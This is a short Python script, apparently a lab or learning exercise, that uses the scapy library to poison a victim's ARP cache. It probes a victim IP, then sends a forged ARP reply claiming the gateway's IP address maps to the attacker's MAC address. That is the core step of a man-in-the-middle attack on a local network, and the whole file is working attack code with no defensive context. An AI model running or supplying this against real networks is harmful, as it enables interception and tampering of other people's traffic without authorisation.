#!/usr/bin/python

# Import scapy
from scapy.all import *

# Setting variables


arping("10.94.71.9")

my_mac="00:0c:29:1e:15:36"
vicIP="10.94.71.9"
gwIP="10.94.71.254"
clientMAC ="b8:ca:3a:aa:63:7d"


packet = ARP(op=2, hwdst= clientMAC, hwsrc=my_mac, psrc=gwIP, pdst=vicIP)
send(packet)
